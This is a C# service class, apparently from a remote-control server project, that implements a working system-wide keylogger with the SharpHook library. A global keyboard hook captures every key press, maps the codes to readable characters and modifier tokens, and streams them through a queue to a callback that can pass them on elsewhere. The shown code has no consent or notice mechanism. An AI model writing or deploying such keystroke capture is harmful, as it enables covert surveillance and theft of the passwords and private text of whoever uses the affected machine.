using System;
using System.Threading.Tasks;
using SharpHook;
using SharpHook.Native;
using SharpHook.Data;
using System.Collections.Concurrent;
using System.Threading;

namespace Server.Services
{
    public class InputService : IDisposable
    {
        private EventLoopGlobalHook? _hook;
        private bool _isRunning = false;
        private Func<string, Task>? _onKeyDataReceived;
        private ConcurrentQueue<string> _keyQueue = new ConcurrentQueue<string>();
        private CancellationTokenSource? _cts;
        private Task? _hookTask;

        public InputService()
        {
        }

        public async Task StartKeyLogger(Func<string, Task> callback)
        {
            if (_isRunning || _hook != null)
            {
                Console.Error.WriteLine(">>> StartKeyLogger: Hook đang chạy! Dừng trước...");
                await StopKeyLogger();
                await Task.Delay(200);
            }
            
            _onKeyDataReceived = callback;
            _isRunning = true;
            _cts = new CancellationTokenSource();

            _hook = new EventLoopGlobalHook();
            Console.Error.WriteLine("Hook instance created");
            
            // Đăng ký event handlers
            _hook.KeyPressed += OnKeyPressedHandler;
            _hook.KeyReleased += OnKeyReleasedHandler;
            
            Console.Error.WriteLine(">>> Event handlers registered");
            
            // Chạy hook trong background task
            _hookTask = Task.Run(async () =>
            {
                try
                {
                    Console.Error.WriteLine(">>> HOOK: Starting...");
                    await _hook.RunAsync();
                    Console.Error.WriteLine(">>> HOOK: Stopped");
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine($">>> HOOK ERROR: {ex.Message}");
                    _isRunning = false;
                }
            });
            
            // Đợi hook khởi động
            await Task.Delay(100);

            // Consumer task để xử lý key queue
            _ = Task.Run(async () =>
            {
                Console.Error.WriteLine(">>> CONSUMER: Started");
                int processedCount = 0;
                
                while (_isRunning && !_cts.Token.IsCancellationRequested)
                {
                    if (_keyQueue.TryDequeue(out var key))
                    {
                        processedCount++;
                        Console.Error.WriteLine($">>> CONSUMER: Processing key #{processedCount}: '{key}'");
                        Console.Write(key);
                        
                        if (_onKeyDataReceived != null)
                        {
                            try
                            {
                                await _onKeyDataReceived(key);
                            }
                            catch (Exception ex)
                            {
                                Console.Error.WriteLine($">>> CONSUMER ERROR: {ex.Message}");
                            }
                        }
                    }
                    else
                    {
                        await Task.Delay(5);
                    }
                }
                
                Console.Error.WriteLine($">>> CONSUMER: Stopped (processed {processedCount} keys)");
            });

            Console.WriteLine("[SERVICE] Keylogger started");
        }

        private void OnKeyPressedHandler(object? sender, KeyboardHookEventArgs e)
        {
            var keyStr = FormatKeyFast(e.Data);
            if (!string.IsNullOrEmpty(keyStr))
            {
                _keyQueue.Enqueue(keyStr);
            }
        }
        
        private void OnKeyReleasedHandler(object? sender, KeyboardHookEventArgs e)
        {
            // Optional: handle key release events
        }

        public async Task StopKeyLogger()
        {
            Console.Error.WriteLine("\n>>> StopKeyLogger: Starting...");
            
            _isRunning = false;
            _cts?.Cancel();
            
            if (_hook != null)
            {
                try
                {
                    Console.Error.WriteLine(">>> StopKeyLogger: Unsubscribing events...");
                    _hook.KeyPressed -= OnKeyPressedHandler;
                    _hook.KeyReleased -= OnKeyReleasedHandler;
                    
                    Console.Error.WriteLine(">>> StopKeyLogger: Disposing hook...");
                    _hook.Dispose();
                    
                    Console.Error.WriteLine(">>> StopKeyLogger: Disposed");
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine($">>> StopKeyLogger ERROR: {ex.Message}");
                }
                _hook = null;
            }
            
            if (_hookTask != null)
            {
                try
                {
                    await Task.WhenAny(_hookTask, Task.Delay(1000));
                }
                catch { }
            }
            
            Console.Error.WriteLine(">>> StopKeyLogger: DONE\n");
        }

        private string FormatKeyFast(KeyboardEventData data)
        {
            var keyCode = data.KeyCode;
            var keyChar = data.KeyChar;

            // Handle modifier keys
            switch (keyCode)
            {
                case KeyCode.VcLeftMeta:
                case KeyCode.VcRightMeta: return "{CMD}";
                case KeyCode.VcLeftShift:
                case KeyCode.VcRightShift: return "{SHIFT}";
                case KeyCode.VcLeftControl:
                case KeyCode.VcRightControl: return "{CTRL}";
                case KeyCode.VcLeftAlt:
                case KeyCode.VcRightAlt: return "{ALT}";
            }

            // Handle character keys
            if (keyChar != 0 && keyChar != 0xFFFE && keyChar != 0xFFFF)
            {
                if (keyChar == '\r' || keyChar == '\n') return "{ENTER}";
                if (keyChar == '\t') return "{TAB}";
                if (keyChar == ' ') return " ";
                return keyChar.ToString();
            }

            // Handle special keys by KeyCode
            switch (keyCode)
            {
                case KeyCode.VcA: return "a";
                case KeyCode.VcB: return "b";
                case KeyCode.VcC: return "c";
                case KeyCode.VcD: return "d";
                case KeyCode.VcE: return "e";
                case KeyCode.VcF: return "f";
                case KeyCode.VcG: return "g";
                case KeyCode.VcH: return "h";
                case KeyCode.VcI: return "i";
                case KeyCode.VcJ: return "j";
                case KeyCode.VcK: return "k";
                case KeyCode.VcL: return "l";
                case KeyCode.VcM: return "m";
                case KeyCode.VcN: return "n";
                case KeyCode.VcO: return "o";
                case KeyCode.VcP: return "p";
                case KeyCode.VcQ: return "q";
                case KeyCode.VcR: return "r";
                case KeyCode.VcS: return "s";
                case KeyCode.VcT: return "t";
                case KeyCode.VcU: return "u";
                case KeyCode.VcV: return "v";
                case KeyCode.VcW: return "w";
                case KeyCode.VcX: return "x";
                case KeyCode.VcY: return "y";
                case KeyCode.VcZ: return "z";
                case KeyCode.Vc0: return "0";
                case KeyCode.Vc1: return "1";
                case KeyCode.Vc2: return "2";
                case KeyCode.Vc3: return "3";
                case KeyCode.Vc4: return "4";
                case KeyCode.Vc5: return "5";
                case KeyCode.Vc6: return "6";
                case KeyCode.Vc7: return "7";
                case KeyCode.Vc8: return "8";
                case KeyCode.Vc9: return "9";
                case KeyCode.VcSpace: return " ";
                case KeyCode.VcEnter: return "{ENTER}";
                case KeyCode.VcBackspace: return "{BACK}";
                case KeyCode.VcTab: return "{TAB}";
                case KeyCode.VcMinus: return "-";
                case KeyCode.VcEquals: return "=";
                case KeyCode.VcOpenBracket: return "[";
                case KeyCode.VcCloseBracket: return "]";
                case KeyCode.VcSemicolon: return ";";
                case KeyCode.VcQuote: return "'";
                case KeyCode.VcComma: return ",";
                case KeyCode.VcPeriod: return ".";
                case KeyCode.VcSlash: return "/";
                default: return "";
            }
        }

        public void Dispose()
        {
            StopKeyLogger().GetAwaiter().GetResult();
            GC.SuppressFinalize(this);
        }

        public async ValueTask DisposeAsync()
        {
            await StopKeyLogger();
            GC.SuppressFinalize(this);
        }
    }
}